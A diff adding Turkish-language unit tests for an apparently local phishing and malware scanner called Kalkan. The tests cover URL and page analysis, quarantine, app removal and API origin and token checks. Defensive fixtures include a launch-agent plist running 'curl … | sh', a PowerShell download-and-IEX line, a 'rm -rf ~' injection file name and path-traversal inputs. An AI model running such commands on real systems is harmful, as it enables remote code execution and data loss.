@@ -5,8 +5,29 @@ import tempfile
 import unittest
 import zipfile
 
-os.environ["KALKAN_DATA_DIR"] = tempfile.mkdtemp(prefix="kalkan-test-")
+# Testler kullanıcının gerçek dosyalarına ASLA dokunmamalı. Dosya taşıyan/silen her modülün klasörü
+# geçici bir köke yönlendirilir. (Önceki bir sürümde dış site koruması testi gerçek ~/.kalkan/karantina
+# klasörüne "boşalt" isteği gönderip kullanıcının karantinadaki dosyalarını silmişti.)
+TEST_KOK = tempfile.mkdtemp(prefix="kalkan-test-")
+for _ad, _alt in {
+    "KALKAN_DATA_DIR": "data", "KALKAN_KARANTINA_DIR": "karantina", "KALKAN_INDIRME_DIZINI": "Downloads",
+    "KALKAN_UYGULAMA_DIZINLERI": "Applications", "KALKAN_KULLANICI_LIBRARY": "Library",
+}.items():
+    os.environ[_ad] = os.path.join(TEST_KOK, _alt)
+os.environ["KALKAN_OTOMATIK_TARAMA_SAAT"] = "0"
+os.environ["KALKAN_WATCH_DIR"] = ""
+os.environ["KALKAN_IMAP_HOST"] = ""
 os.environ["KALKAN_LLM"] = "0"  # testler dış API çağırmaz (.env'deki ayarı ezer)
+os.environ["KALKAN_TOKEN"] = "test-anahtari-" + "x" * 32
+os.environ["KALKAN_IZINLI_HOSTLAR"] = "127.0.0.1,localhost,testserver"
+
+from kalkan import config as _config  # noqa: E402
+
+# Yönlendirme tutmadıysa (ör. .env ya da kabuk değişkeni öncelik aldıysa) hiçbir test çalışmasın
+for _yol in (_config.DATA_DIR, _config.KARANTINA_DIR, _config.INDIRME_DIZINI, _config.KULLANICI_LIBRARY,
+             *_config.UYGULAMA_DIZINLERI):
+    if not os.path.realpath(str(_yol)).startswith(os.path.realpath(TEST_KOK)):
+        raise SystemExit(f"GÜVENLİK: test ayarı gerçek bir klasörü gösteriyor: {_yol}")
 
 from kalkan.detectors.file import EICAR, dosya_analiz  # noqa: E402
 from kalkan.detectors.text import metin_analiz  # noqa: E402
@@ -33,6 +54,24 @@ class UrlTest(unittest.TestCase):
     def test_url_bulma(self):
         self.assertEqual(urlleri_bul("Bkz: ptt-kargo.top ve https://a.com/b."), ["ptt-kargo.top", "https://a.com/b"])
         self.assertEqual(urlleri_bul("Ekteki rapor.pdf dosyasına bak"), [])
+
+    def test_kelime_ve_dosya_adi_adres_sayilmaz(self):
+        # Boşluğu kaybolmuş Türkçe metin ve paket adları gerçek veride yanlış alarm üretiyordu
+        self.assertEqual(urlleri_bul("3.sınıf öğrencileri olması.Yukarıdaki alsa-driver-0.9.0.rpm NET.WORKS"), [])
+
+    def test_populer_siteler_ml_yanlis_alarmi_vermez(self):
+        # Tam URL ile eğitilen ilk model bunlara %90+ phishing diyordu (PhiUSIIL yol kestirmesi)
+        for u in ["https://github.com/anthropics", "https://mail.google.com/mail/u/0/", "https://docs.python.org/3/",
+                  "https://www.yapayzekaokulum.com/egitimler", "https://www.meb.gov.tr", "https://odtu.edu.tr/x"]:
+            self.assertEqual(url_analiz(u).seviye, "guvenli", u)
+
+    def test_ucretsiz_barindirma_guvenilir_sayilmaz(self):
+        s = url_analiz("https://ziraat-giris.web.app/")
+        self.assertIn("kullanici_icerigi", [b.kod for b in s.bulgular])
+        self.assertNotEqual(s.seviye, "guvenli")
+
+    def test_kisaltici_ml_e_sorulmaz(self):
+        self.assertNotIn("ml_url", [b.kod for b in url_analiz("http://tinyurl.com/1usn").bulgular])
 
 
 class MetinTest(unittest.TestCase):
@@ -96,6 +135,414 @@ class DosyaTest(unittest.TestCase):
     def test_temiz_dosyalar(self):
         self.assertEqual(dosya_analiz(b"merhaba", "not.txt").seviye, "guvenli")
         self.assertEqual(dosya_analiz(b"%PDF-1.7\n1 0 obj<<>>endobj", "rapor.pdf").seviye, "guvenli")
+
+
+class SayfaTest(unittest.TestCase):
+    def test_sahte_giris_sayfasi(self):
+        from kalkan.detectors.page import sayfa_analiz
+        s = sayfa_analiz("https://ziraat-bireysel.web.app/", "Ziraat Bankası İnternet Şubesi", "Şifrenizi girin",
+                         [{"action": "https://topla.example.ru/p.php", "sifre": True}])
+        kodlar = [b.kod for b in s.bulgular]
+        self.assertEqual(s.seviye, "tehlikeli")
+        self.assertIn("sahte_giris_sayfasi", kodlar)
+        self.assertIn("form_baska_alana", kodlar)
+
+    def test_gercek_banka_sayfasi(self):
+        from kalkan.detectors.page import sayfa_analiz
+        s = sayfa_analiz("https://www.ziraatbank.com.tr/tr", "Ziraat Bankası", "Giriş",
+                         [{"action": "https://www.ziraatbank.com.tr/login", "sifre": True}])
+        self.assertEqual(s.seviye, "guvenli")
+
+    def test_sifre_formsuz_siradan_sayfa(self):
+        from kalkan.detectors.page import sayfa_analiz
+        self.assertEqual(sayfa_analiz("https://www.wikipedia.org/", "Wikipedia", "Özgür ansiklopedi", []).seviye, "guvenli")
+
+
+class GorselTest(unittest.TestCase):
+    def test_qr_icindeki_riskli_baglanti(self):
+        import cv2
+        from kalkan.detectors.image import gorsel_analiz
+        img = cv2.QRCodeEncoder.create().encode("https://ptt-kargo-teslimat.top/odeme")
+        img = cv2.copyMakeBorder(cv2.resize(img, None, fx=8, fy=8, interpolation=cv2.INTER_NEAREST),
+                                 40, 40, 40, 40, cv2.BORDER_CONSTANT, value=255)
+        s = gorsel_analiz(cv2.imencode(".png", img)[1].tobytes(), "qr.png")
+        self.assertEqual(s.ek["qr"][0]["icerik"], "https://ptt-kargo-teslimat.top/odeme")
+        self.assertEqual(s.seviye, "tehlikeli")
+
+    def test_qr_olmayan_gorsel(self):
+        import cv2
+        import numpy as np
+        from kalkan.detectors.image import gorsel_analiz
+        s = gorsel_analiz(cv2.imencode(".png", np.full((80, 80), 255, np.uint8))[1].tobytes(), "bos.png")
+        self.assertEqual((s.ek["qr"], s.seviye), ([], "guvenli"))
+
+
+class TopluTest(unittest.TestCase):
+    def test_url_listesi_ve_eml_zip(self):
+        from kalkan.bulk import ogeler
+        self.assertEqual([t for t, _ in ogeler("l.txt", b"https://a.com\nmerhaba\nptt-kargo.top\n")], ["url", "url"])
+        tampon = io.BytesIO()
+        with zipfile.ZipFile(tampon, "w") as z:
+            z.writestr("a.eml", "Subject: x\n\nmerhaba")
+            z.writestr("b.eml", "Subject: y\n\nselam")
+        self.assertEqual(len(list(ogeler("posta.zip", tampon.getvalue()))), 2)
+
+    def test_desteklenmeyen_bicim(self):
+        from kalkan.bulk import ogeler
+        with self.assertRaises(ValueError):
+            list(ogeler("x.docx", b"..."))
+
+
+class IndirmeGuvenlikTest(unittest.TestCase):
+    def test_indirilenler_disindaki_dosya_okunmaz(self):
+        from kalkan import config, service, store
+        store.hazirla()
+        with tempfile.TemporaryDirectory() as d:
+            eski = config.INDIRME_DIZINI
+            config.INDIRME_DIZINI = d
+            try:
+                with self.assertRaises(PermissionError):
+                    service.indirme_tara("/etc/hosts")
+                with self.assertRaises(PermissionError):  # ../ ile kaçış denemesi
+                    service.indirme_tara(os.path.join(d, "..", "..", "etc", "hosts"))
+                yol = os.path.join(d, "dekont.pdf.exe")
+                with open(yol, "wb") as f:
+                    f.write(b"MZ" + b"\0" * 64)
+                self.assertEqual(service.indirme_tara(yol)["seviye"], "tehlikeli")
+            finally:
+                config.INDIRME_DIZINI = eski
+
+
+class SistemTaramaTest(unittest.TestCase):
+    def setUp(self):
+        from kalkan import config, store
+        store.hazirla()
+        self.d = tempfile.mkdtemp(prefix="kalkan-pc-")
+        self.eski_karantina = config.KARANTINA_DIR
+        config.KARANTINA_DIR = __import__("pathlib").Path(self.d) / "karantina"
+
+    def tearDown(self):
+        from kalkan import config
+        config.KARANTINA_DIR = self.eski_karantina
+
+    def _bekle(self, is_id):
+        import time
+        from kalkan import sistem_tarama
+        while sistem_tarama.durum(is_id)["durum"] == "calisiyor":
+            time.sleep(0.05)
+        return sistem_tarama.durum(is_id)
+
+    def test_klasor_taramasi_ve_karantina(self):
+        from kalkan import karantina, sistem_tarama
+        k = os.path.join(self.d, "indir")
+        os.makedirs(os.path.join(k, "node_modules"))
+        with open(os.path.join(k, "dekont.pdf.exe"), "wb") as f:
+            f.write(b"MZ" + b"\0" * 100)
+        with open(os.path.join(k, "node_modules", "x.pdf.exe"), "wb") as f:  # atlanan klasör
+            f.write(b"MZ" + b"\0" * 100)
+        with open(os.path.join(k, "foto.jpg"), "wb") as f:
+            f.write(b"\xff\xd8\xff" + b"\0" * 100)
+        with open(os.path.join(k, "arac"), "wb") as f:  # macOS programı: olağan
+            f.write(b"\xcf\xfa\xed\xfe" + b"\0" * 100)
+        with open(os.path.join(k, "kurulum.dmg"), "wb") as f:  # kurulum dosyası: olağan
+            f.write(b"koly" + b"\0" * 100)
+        with open(os.path.join(k, "~$rapor.docx"), "wb") as f:  # Word kilit dosyası
+            f.write(b"\0" * 162)
+        d = self._bekle(sistem_tarama.baslat("klasor", k))
+        self.assertEqual(d["durum"], "bitti")
+        self.assertEqual([os.path.basename(b["yol"]) for b in d["bulgular"]], ["dekont.pdf.exe"])
+
+        b = d["bulgular"][0]
+        meta = karantina.al(b["yol"], b["sha256"], b["nedenler"])
+        self.assertFalse(os.path.exists(b["yol"]))
+        self.assertEqual(len(karantina.listele()), 1)
+        karantina.geri_yukle(meta["id"])
+        self.assertTrue(os.path.exists(b["yol"]))
+        self.assertEqual(karantina.listele(), [])
+
+    def test_karantina_kalici_silme_ve_bosaltma(self):
+        from kalkan import karantina
+        yollar = []
+        for i in range(3):
+            y = os.path.join(self.d, f"z{i}.exe")
+            with open(y, "wb") as f:
+                f.write(b"MZ" + bytes([i]) * 50)
+            yollar.append(y)
+        metalar = [karantina.al(y, None, ["test"]) for y in yollar]
+        karantina.kalici_sil(metalar[0]["id"])
+        self.assertEqual(len(karantina.listele()), 2)
+        self.assertFalse(any(p.name.startswith(metalar[0]["id"]) for p in karantina._dizin().iterdir()))
+        self.assertEqual(karantina.bosalt(), 2)
+        self.assertEqual(list(karantina._dizin().iterdir()), [])
+        with self.assertRaises(ValueError):
+            karantina.kalici_sil("../../etc")  # yol kaçışı denemesi
+
+    def test_cop_kutusuna_tasima(self):
+        # Gerçek Finder'ı tetiklememek için osascript başarısız sayılır, ev klasörü geçici klasöre yönlendirilir
+        from pathlib import Path
+        from unittest import mock
+        from kalkan import karantina
+        y = os.path.join(self.d, "kotu.pdf.exe")
+        with open(y, "wb") as f:
+            f.write(b"MZ" + b"\0" * 50)
+        sahte_ev = Path(self.d) / "ev"
+        with mock.patch.object(karantina.platform, "system", return_value="Darwin"), \
+             mock.patch.object(karantina.subprocess, "run", return_value=mock.Mock(returncode=1)), \
+             mock.patch.object(karantina.Path, "home", return_value=sahte_ev):
+            nereye = karantina.cop_kutusuna_tasi(y)
+        self.assertFalse(os.path.exists(y))
+        self.assertTrue((sahte_ev / ".Trash" / "kotu.pdf.exe").exists())
+        self.assertIn(".Trash", nereye)
+
+    def test_klasorde_goster_kabuk_kullanmaz(self):
+        from unittest import mock
+        from kalkan import karantina
+        y = os.path.join(self.d, "a; rm -rf ~.exe")  # kabuk enjeksiyonu denemesi: ad olduğu gibi tek argüman kalmalı
+        open(y, "wb").close()
+        with mock.patch.object(karantina.platform, "system", return_value="Darwin"), \
+             mock.patch.object(karantina.subprocess, "run") as calis:
+            karantina.klasorde_goster(y)
+        self.assertEqual(calis.call_args[0][0], ["open", "-R", y])
+        self.assertNotIn("shell", calis.call_args[1])
+
+    def test_degisen_dosya_karantinaya_alinmaz(self):
+        from kalkan import karantina
+        yol = os.path.join(self.d, "a.exe")
+        with open(yol, "wb") as f:
+            f.write(b"MZ yeni icerik")
+        with self.assertRaises(ValueError):
+            karantina.al(yol, "0" * 64, [])
+        self.assertTrue(os.path.exists(yol))
+
+    def test_baslangic_ogeleri(self):
+        import plistlib
+        from pathlib import Path
+        from kalkan.sistem_tarama import baslangic_ogesi_analiz
+        kotu = Path(self.d) / "com.guncelle.plist"
+        plistlib.dump({"Label": "com.guncelle", "ProgramArguments": ["/bin/bash", "-c", "curl -s http://x.top/a | sh"]},
+                      open(kotu, "wb"))
+        iyi = Path(self.d) / "com.dropbox.plist"
+        plistlib.dump({"Label": "com.dropbox", "ProgramArguments": ["/Applications/Dropbox.app/Contents/MacOS/Dropbox"]},
+                      open(iyi, "wb"))
+        gizli = Path(self.d) / "com.x.plist"
+        plistlib.dump({"Label": "com.x", "Program": "/tmp/.x/ajan"}, open(gizli, "wb"))
+        self.assertEqual(baslangic_ogesi_analiz(kotu).seviye, "tehlikeli")
+        self.assertIsNone(baslangic_ogesi_analiz(iyi))
+        self.assertNotEqual(baslangic_ogesi_analiz(gizli).seviye, "guvenli")
+
+    def test_uygulama_onbellegindeki_js_alarm_vermez(self):
+        # Gerçek bir Mac'te TikTok LIVE Studio önbelleğindeki 133 .js dosyası "downloadFile" adı yüzünden
+        # şüpheli bulunmuş ve karantinaya alınmıştı
+        js = b"export async function downloadFile(url){ const r = await fetch(url); return r.blob(); }"
+        self.assertEqual(dosya_analiz(js, "template.js", baglam="sistem").seviye, "guvenli")
+        tampon = io.BytesIO()
+        with zipfile.ZipFile(tampon, "w") as z:
+            z.writestr("plugin/index.js", js)
+        self.assertEqual(dosya_analiz(tampon.getvalue(), "res.zip", baglam="sistem").seviye, "guvenli")
+        # Uygulama veri klasöründeki betikler sistem taramasında derin incelenmez
+        from pathlib import Path
+        from kalkan import sistem_tarama
+        self.assertFalse(sistem_tarama._derin_mi(Path.home() / "Library" / "Application Support" / "X" / "a.js"))
+        self.assertFalse(sistem_tarama._derin_mi(Path.home() / ".vscode" / "extensions" / "y" / "b.js"))
+        # Gerçek PowerShell indirme komutu hâlâ yakalanır
+        ps = b"(New-Object Net.WebClient).DownloadString('http://x.top/a.ps1') | IEX"
+        self.assertIn("supheli_kod", [b.kod for b in dosya_analiz(ps, "kur.ps1").bulgular])
+
+    def test_pdf_icindeki_rastgele_iex_alarm_vermez(self):
+        # Gerçek PDF'lerde sıkıştırılmış veride rastgele "IeX" yanlış alarm üretiyordu
+        s = dosya_analiz(b"%PDF-1.7\nstream\x89IeX\x02\x91endstream", "belge.pdf", baglam="sistem")
+        self.assertEqual(s.seviye, "guvenli")
+
+
+class UygulamaKaldirmaTest(unittest.TestCase):
+    """Sahte uygulama ve Library klasörleriyle; gerçek uygulamalara ve Çöp Kutusu'na dokunulmaz."""
+
+    def setUp(self):
+        import plistlib
+        import shutil
+        from pathlib import Path
+        from unittest import mock
+        from kalkan import config, karantina, uygulamalar
+        self.d = Path(tempfile.mkdtemp(prefix="kalkan-uyg-"))
+        self.apps, self.lib, self.cop = self.d / "Applications", self.d / "Library", self.d / "Cop"
+        for k in (self.apps, self.lib, self.cop):
+            k.mkdir()
+
+        def uygulama(ad, bid):
+            a = self.apps / f"{ad}.app" / "Contents"
+            (a / "MacOS").mkdir(parents=True)
+            plistlib.dump({"CFBundleIdentifier": bid, "CFBundleName": ad, "CFBundleShortVersionString": "1.0"},
+                          open(a / "Info.plist", "wb"))
+
+        uygulama("Notlarim", "com.ornek.notlarim")
+        uygulama("Safari", "com.apple.Safari")  # sistem uygulaması: listelenmemeli
+        uygulama("Google Drive", "com.google.drivefs")
+        for yol in ["Application Support/com.ornek.notlarim/veri.db", "Caches/com.ornek.notlarim/a",
+                    "Containers/com.ornek.notlarim/x", "Application Support/Notlarim/ayar.json",
+                    "Group Containers/ABCDE12345.com.ornek.notlarim/g", "Application Support/Google/paylasilan"]:
+            (self.lib / yol).parent.mkdir(parents=True, exist_ok=True)
+            (self.lib / yol).write_text("x")
+        (self.lib / "Preferences").mkdir()
+        (self.lib / "Preferences" / "com.ornek.notlarim.plist").write_text("p")
+        (self.lib / "LaunchAgents").mkdir()
+        (self.lib / "LaunchAgents" / "com.ornek.notlarim.helper.plist").write_text("l")
+
+        def sahte_cop(kaynak):
+            shutil.move(str(kaynak), str(self.cop / kaynak.name))
+            return "Çöp Kutusu"
+
+        self.yamalar = [
+            mock.patch.object(config, "UYGULAMA_DIZINLERI", [str(self.apps)]),
+            mock.patch.object(config, "KULLANICI_LIBRARY", str(self.lib)),
+            mock.patch.object(karantina, "cop_kutusuna", side_effect=sahte_cop),
+            mock.patch.object(uygulamalar, "_calisiyor_mu", return_value=False),
+        ]
+        for y in self.yamalar:
+            y.start()
+        self.u = uygulamalar
+
+    def tearDown(self):
+        for y in self.yamalar:
+            y.stop()
+
+    def _id(self, ad):
+        return next(a["id"] for a in self.u.listele()["uygulamalar"] if a["ad"] == ad)
+
+    def test_sistem_uygulamalari_listelenmez(self):
+        adlar = {a["ad"] for a in self.u.listele()["uygulamalar"]}
+        self.assertEqual(adlar, {"Notlarim", "Google Drive"})
+
+    def test_artiklar_bulunur_paylasilan_klasor_onerilmez(self):
+        d = self.u.artiklar(self._id("Notlarim"))
+        bulunan = {os.path.relpath(a["yol"], self.lib) for a in d["artiklar"]}
+        self.assertEqual(bulunan, {
+            "Application Support/com.ornek.notlarim", "Caches/com.ornek.notlarim", "Containers/com.ornek.notlarim",
+            "Preferences/com.ornek.notlarim.plist", "LaunchAgents/com.ornek.notlarim.helper.plist",
+            "Group Containers/ABCDE12345.com.ornek.notlarim", "Application Support/Notlarim"})
+        # "Google Drive" için ad eşleşmesi "Google Drive" klasörünü arar; ortak "Google" klasörü asla önerilmez
+        g = {os.path.relpath(a["yol"], self.lib) for a in self.u.artiklar(self._id("Google Drive"))["artiklar"]}
+        self.assertNotIn("Application Support/Google", g)
+
+    def test_kaldirma_uygulama_ve_secilen_artiklar(self):
+        kimlik = self._id("Notlarim")
+        d = self.u.artiklar(kimlik)
+        secilen = [a["yol"] for a in d["artiklar"] if "Caches" not in a["yol"]]
+        r = self.u.kaldir(kimlik, secilen)
+        self.assertFalse((self.apps / "Notlarim.app").exists())
+        self.assertTrue((self.cop / "Notlarim.app").exists())
+        self.assertEqual(len(r["artiklar"]), len(secilen))
+        self.assertTrue((self.lib / "Caches" / "com.ornek.notlarim").exists())  # seçilmeyen yerinde kalır
+        self.assertTrue((self.apps / "Safari.app").exists())
+
+    def test_listede_olmayan_yol_reddedilir(self):
+        kimlik = self._id("Notlarim")
+        with self.assertRaises(PermissionError):
+            self.u.kaldir(kimlik, [str(self.d / "Documents")])
+        self.assertTrue((self.apps / "Notlarim.app").exists())  # hiçbir şey taşınmadı
+
+    def test_acik_uygulama_kaldirilmaz(self):
+        from unittest import mock
+        with mock.patch.object(self.u, "_calisiyor_mu", return_value=True):
+            with self.assertRaises(RuntimeError):
+                self.u.kaldir(self._id("Notlarim"), [])
+        self.assertTrue((self.apps / "Notlarim.app").exists())
+
+
+class MacUygulamaPaketiTest(unittest.TestCase):
+    """Kalkan.app geçici klasöre oluşturulur; launchctl çağrılmaz, gerçek ~/Applications'a dokunulmaz."""
+
+    def test_uygulama_ve_servis_dosyalari(self):
+        import plistlib
+        import platform
+        from pathlib import Path
+        from kalkan import kur_mac
+        if platform.system() != "Darwin":
+            self.skipTest("yalnızca macOS")
+        d = Path(tempfile.mkdtemp(prefix="kalkan-app-"))
+        yollar = {"app": d / "Applications" / "Kalkan.app", "plist": d / "LaunchAgents" / "kalkan.plist", "log": d / "Logs"}
+        kur_mac.kur(yollar, servis=False)
+        app = yollar["app"]
+        info = plistlib.load(open(app / "Contents" / "Info.plist", "rb"))
+        self.assertEqual((info["CFBundleExecutable"], info["CFBundleIdentifier"]), ("Kalkan", "com.yapayzekaokulum.kalkan"))
+        for betik in ("Kalkan", "kalkan-sunucu"):
+            yol = app / "Contents" / "MacOS" / betik
+            self.assertTrue(os.access(yol, os.X_OK), betik)
+            self.assertIn("-m kalkan.", yol.read_text())
+        servis = plistlib.load(open(yollar["plist"], "rb"))
+        self.assertTrue(servis["RunAtLoad"])
+        self.assertEqual(servis["ProgramArguments"], [str(app / "Contents" / "MacOS" / "kalkan-sunucu")])
+        if "CFBundleIconFile" in info:
+            self.assertTrue((app / "Contents" / "Resources" / "Kalkan.icns").stat().st_size > 1000)
+        # Kalkan kendi başlangıç öğesini zararlı saymamalı
+        from kalkan.sistem_tarama import baslangic_ogesi_analiz
+        self.assertIsNone(baslangic_ogesi_analiz(yollar["plist"]))
+
+
+class BaskaSiteKorumaTest(unittest.TestCase):
+    ANAHTAR = {"X-Kalkan-Token": "test-anahtari-" + "x" * 32}
+
+    def test_dis_siteden_gelen_degisiklik_istegi_reddedilir(self):
+        from fastapi.testclient import TestClient
+        from kalkan.main import app
+        # Koruma tüm değişiklik isteklerine aynı ara katmanda uygulanır; bu yüzden zararsız bir uç noktayla
+        # sınanır. Dosya silen uç noktalar (karantinayı boşalt vb.) testte asla çağrılmaz.
+        govde = {"url": "https://a.com"}
+        with TestClient(app) as c:
+            r = c.post("/api/tara/url", json=govde, headers={**self.ANAHTAR, "Origin": "https://kotu-site.example"})
+            self.assertEqual(r.status_code, 403)
+            r = c.post("/api/tara/url", json=govde, headers={**self.ANAHTAR, "Origin": "null"})
+            self.assertEqual(r.status_code, 403)
+            # Panelin kendisi, Chrome eklentisi ve Origin göndermeyen yerel araçlar (anahtarla) kabul edilir
+            for origin in ("http://testserver", "chrome-extension://abcdef", None):
+                h = dict(self.ANAHTAR, **({"Origin": origin} if origin else {}))
+                self.assertEqual(c.post("/api/tara/url", json=govde, headers=h).status_code, 200, origin)
+            self.assertEqual(c.get("/api/durum", headers={"Origin": "https://kotu-site.example"}).status_code, 200)
+
+    def test_dns_rebinding_reddedilir(self):
+        # Saldırganın alan adı 127.0.0.1'e çözülse bile Host başlığı onun adıdır: hiçbir istek yanıtlanmaz
+        from fastapi.testclient import TestClient
+        from kalkan.main import app
+        with TestClient(app) as c:
+            for yol in ("/", "/api/durum", "/api/gecmis", "/api/uygulamalar"):
+                r = c.get(yol, headers={**self.ANAHTAR, "Host": "kotu-site.example:8790"})
+                self.assertEqual(r.status_code, 400, yol)
+
+    def test_anahtarsiz_ve_adres_satirindaki_anahtar_reddedilir(self):
+        from fastapi.testclient import TestClient
+        from kalkan.main import app
+        with TestClient(app) as c:
+            c.cookies.clear()
+            self.assertEqual(c.get("/api/gecmis").status_code, 401)
+            self.assertEqual(c.get("/api/eklenti/anahtar").status_code, 401)
+            self.assertEqual(c.get("/api/gecmis?token=" + self.ANAHTAR["X-Kalkan-Token"]).status_code, 401)
+            self.assertEqual(c.get("/api/gecmis", headers={"X-Kalkan-Token": "yanlis"}).status_code, 401)
+            self.assertEqual(c.post("/api/oturum", headers={"X-Kalkan-Token": "yanlis"}).status_code, 401)
+            self.assertEqual(c.get("/api/gecmis", headers=self.ANAHTAR).status_code, 200)
+
+    def test_panel_cerezi(self):
+        from fastapi.testclient import TestClient
+        from kalkan.main import CEREZ, app
+        with TestClient(app) as c:
+            r = c.get("/")
+            cerez = r.headers.get("set-cookie", "")
+            self.assertIn(CEREZ, cerez)
+            self.assertIn("HttpOnly", cerez)
+            self.assertIn("samesite=strict", cerez.lower())
+            self.assertEqual(c.get("/api/gecmis").status_code, 200)  # çerezle, başlıksız
+            self.assertEqual(c.get("/api/eklenti/anahtar").json()["anahtar"], self.ANAHTAR["X-Kalkan-Token"])
+
+    def test_anahtar_dosyasi_yalnizca_kullaniciya_acik(self):
+        import stat
+        from pathlib import Path
+        from unittest import mock
+        from kalkan import config
+        d = Path(tempfile.mkdtemp(prefix="kalkan-anahtar-"))
+        with mock.patch.dict(os.environ, {"KALKAN_TOKEN": ""}), mock.patch.object(config, "DATA_DIR", d):
+            a1 = config._erisim_anahtari()
+            a2 = config._erisim_anahtari()
+        self.assertEqual(a1, a2)  # ikinci açılışta aynı anahtar
+        self.assertGreaterEqual(len(a1), 32)
+        self.assertEqual(stat.S_IMODE((d / "erisim_anahtari").stat().st_mode), 0o600)
 
 
 class LlmBirlestirmeTest(unittest.TestCase):
